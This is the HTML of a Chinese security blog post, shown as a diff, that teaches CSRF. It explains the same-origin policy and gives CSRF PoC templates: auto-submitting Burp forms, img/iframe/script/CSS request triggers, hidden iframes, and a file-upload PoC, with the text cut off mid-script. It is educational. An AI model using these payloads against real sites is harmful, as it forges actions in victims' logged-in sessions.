@@ -1,0 +1,1174 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CSRF漏洞学习, Joker">
+    <meta name="description" content="CSRF漏洞学习">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>CSRF漏洞学习 | Joker</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Joker</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Joker</div>
+        <div class="logo-desc">
+            
+            一个默默无闻的web手
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/j0k3r-z" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/j0k3r-z" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CSRF漏洞学习</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-04-04
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-04-05
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>这是CSRF篇哈，如果说XSS主要在于前端和浏览器的话，CSRF可能就更接近浏览器和前端的知识，面比较广，关于浏览器和一些策略只做简单了解。</p>
+<h1 id="0x01什么是CSRF？"><a href="#0x01什么是CSRF？" class="headerlink" title="0x01什么是CSRF？"></a>0x01什么是CSRF？</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)是一种挟持用户在当前已登录的Web应用程序上执行非本意的操作的一种攻击方式。</p>
+<blockquote>
+<p>简单的说，跨站请求伪造攻击是攻击者通过手段欺骗用户的浏览器去访问用户曾经认证过的网站并执行一些操作（如发送邮件、发消息、甚至财产操作如转账和购买商品等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web登录身份认证的一个漏洞：简单的身份认证只能保证请求来自用户的浏览器，但不能识别请求是用户自愿发出的</p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用身份认证的缺陷，通过在恶意站点伪造请求，诱使被攻击者携带存储在浏览器中的认证信息去执行被伪造的请求，而导致操作被执行。主要的原因就在于，站点对于身份认证机制不完全所导致的。</p>
+<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>没具体看同源策略的产生事件（补充：1995年），不过我猜测同源策略应该是再csrf之后产生的，通过上面我们就可以发现，要利用的话需要执行挂站点的操作也就是（域）。而同源策略则是再这个地方做了限制，下面会略微讲一下什么是同源策略：附一个连接：<a href="https://lightless.me/archives/review-SOP.html" target="_blank" rel="noopener">再谈同源策略</a>这篇对同源策略和CORS做了讲解</p>
+<h3 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h3><p>何为同源：</p>
+<blockquote>
+<p>如果两个页面拥有相同的协议（http、https）、相同的端口（如果其中一个指定了端口）、相同的 host，那么就可以认为这两个页面是同源的。简单的讲，同源策略就是同协议、同端口、同 host 这样的一个三元组（需要注意的是IE当中，不检查端口）</p>
+</blockquote>
+<p><img src="https://lightless-blog.oss-cn-shanghai.aliyuncs.com/review-sop-1.png" alt><br>到这里大概以知道同源策略是做什么的了，就是限制非同源之间的访问。</p>
+<blockquote>
+<p>同源策略是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
+</blockquote>
+<p>这样就能防止CSRF了嘛？明显不可能，网站之间肯定要进行跨域操作的，尤其是随着目前互联网之间的各种交互，而明显有同源策略的限制很不方便，这就是JSONP、CORS的由来了……但基于JSONP、CORS仍产生了很多的安全问题如：JSONP跨域漏洞和CORS跨域漏洞，这里不做详解，回头专门总结下。<del>其实我不认为这属于CSRF漏洞，感觉更多的类似于中间件漏洞一样，利用这个来实现我们的跨域操作</del>（补充一下，了解完之后，我发现其实也算是CSRF的一个变种，刚开始没理解有什么作用，但是了解后发现，跨域漏洞的利用是为了跨域读，来获取用户的敏感信息，这是CSRF做不到的，但也有一些局限性，必须要有敏感信息的输出，才能够劫持），继续回到同源策略，其实不利用上面的两种方式仍能进行跨域，原因的话就是同源操纵的限制了。看下面：</p>
+<p>对于页面跨域的行为分为三类：<br>（1） <strong>跨域写操作（Cross-origin writes）</strong>一般是被允许的。例如链接（links），重定向以及表单提交。特定少数的HTTP请求需要添加 preflight。<br>（2）<strong>跨域资源嵌入（Cross-origin embedding）</strong>一般是被允许<br>（3）<strong>跨域读操作（Cross-origin reads）</strong>一般是不被允许的，但常可以通过内嵌资源来巧妙的进行读取访问</p>
+<p>可以看到除了读，一般都是允许的，而CSRF本来就是进行的写操作，基本不受影响。下面列举一些允许嵌入的标签：</p>
+<pre><code>(1)&lt;script src=&quot;...&quot;&gt;&lt;/script&gt; 标签嵌入跨域脚本。语法错误信息只能被同源脚本中捕捉到。
+
+(2)&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的 HTTP 头部 Content-Type 。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。
+
+(3)通过 &lt;img&gt; 展示的图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...
+
+(4)通过 &lt;video&gt; 和 &lt;audio&gt; 播放的多媒体资源。
+
+(5)通过 &lt;object&gt;、 &lt;embed&gt; 和 &lt;applet&gt; 嵌入的插件。
+
+(6)通过 @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。
+
+(7)通过 &lt;iframe&gt; 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</code></pre><p>这样我们利用上面的标签进行跨域 完全可以 如<code>&lt;img&gt;</code></p>
+<h1 id="0x02-CSRF的利用方式"><a href="#0x02-CSRF的利用方式" class="headerlink" title="0x02 CSRF的利用方式"></a>0x02 CSRF的利用方式</h1><h2 id="可利用标签"><a href="#可利用标签" class="headerlink" title="可利用标签"></a>可利用标签</h2><p>可利用方式如下：</p>
+<pre><code>&lt;a&gt;标签
+&lt;img&gt;标签
+&lt;script&gt;标签
+&lt;iframe&gt;标签
+&lt;link&gt;标签
+CSS方法
+JavaScript方法：Image对象、XMLHTTP对象</code></pre><p>下面列举一下常用的形式<br>burp生成form标签：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token comment" spellcheck="true">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>URL<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<p>a标签</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>Click Me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre>
+<p>img标签：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span></code></pre>
+<p>iframe标签：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span></code></pre>
+<p>script标签：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span></code></pre>
+<p>link标签：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></code></pre>
+<p>通过CSS触发：</p>
+<pre class=" language-html"><code class="language-html">*{background: url('URL?test=mi1k7ea&amp;test1=mi1k7ea&amp;Change=Change#');}
+当然要通过标签引入该CSS文件：
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
+<p>可以发现上面有些都需要用户进行点击才能触发，如burp的和<code>&lt;a&gt;</code>标签，这是就可以用script脚本来模拟点击</p>
+<pre class=" language-html"><code class="language-html">from表单
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+  <span class="token keyword">var</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  m<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+
+a标签
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+  <span class="token keyword">var</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  m<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
+<h2 id="hinden隐藏攻击过程"><a href="#hinden隐藏攻击过程" class="headerlink" title="hinden隐藏攻击过程"></a>hinden隐藏攻击过程</h2><p>其实可以发现，我们在攻击成功后，有些标签仍会停留在我们的攻击页面，而且还有些标签时分的明显，这是我们就可以用hidden属性，来隐藏属性框<br>如iframe：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf.html<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+或
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf.html<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre>
+<h2 id="XSS-CSRF"><a href="#XSS-CSRF" class="headerlink" title="XSS+CSRF"></a>XSS+CSRF</h2><p>这是常见的配合了，如果站点对CSRF漏洞设置了token机制来进行防御、但站点存在XSS漏洞可窃取CSRF token导致CSRF防御形同虚设，又如站点设置了HttpOnly限制XSS不能窃取用户cookie信息、但站点存在CSRF漏洞可被利用来进行其他的一些恶意表单操作。<br>利用两者的配合，可以让绕过一些限制，同时是的本来比较鸡肋的漏洞，变为大杀器。</p>
+<p>再比如，如果一个XSS出现在了只能自己看到的地方，怎么办？根本没法利用，而这时候就可以和csrf进行配合。</p>
+<p>下面列举一写案例：<br><a href="https://www.cnblogs.com/xishaonian/p/6557769.html" target="_blank" rel="noopener">一次csrf配合xss的攻击实例</a><br><a href="https://www.freebuf.com/articles/web/164069.html" target="_blank" rel="noopener">鸡肋CSRF和Self-XSS组合的变废为宝</a><br><a href="https://parrotsec-cn.org/t/topic/1423" target="_blank" rel="noopener">一次XSS+CSRF的组合拳进攻(CSRF+JSON)</a></p>
+<h2 id="CSRF-文件上传"><a href="#CSRF-文件上传" class="headerlink" title="CSRF+文件上传"></a>CSRF+文件上传</h2><p>文件上传都是通过POST方式来上传的，而POST方式的CSRF只能通过表单的方式来发起攻击。这就存在一个问题，就是构造的表单提交的数据跟浏览器文件上传提交的数据会有所区别，即上传的请求会有一个filename的参数：</p>
+<pre><code>-----------------------------70772515222937
+Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;phpinfo.php&quot;
+Content-Type: application/octet-stream
+
+&lt;?php
+    phpinfo();
+?&gt;
+-----------------------------70772515222937</code></pre><p>如果通过构造表单的方式实现文件上传，是没办法构造filename参数的，这是因为filename参数是由<code>&lt;input&gt;</code>标签自动生成的，是没办法通过表单来实现伪造的，从而能防御CSRF实现文件上传。<br>这时候CORS就能利用到了，我们可以利用它来对目标站点的上传点发起问及那上传请求，这是因为<strong>CORS虽然不允许非法的外域读取本站点的资源、但并不阻止外域向本站发起请求，而CSRF刚刚好只是发起操作请求而非读取站点资源</strong>，这就构成了CSRF+文件上传漏洞的组合拳场景。（需要注意的是，这并非CORS漏洞，而是正常的CORS请求，与上面提到的CORS跨域漏洞不同）可以利用burp生成，再加上自动提交就可以了</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    <span class="token keyword">function</span> <span class="token function">submitRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
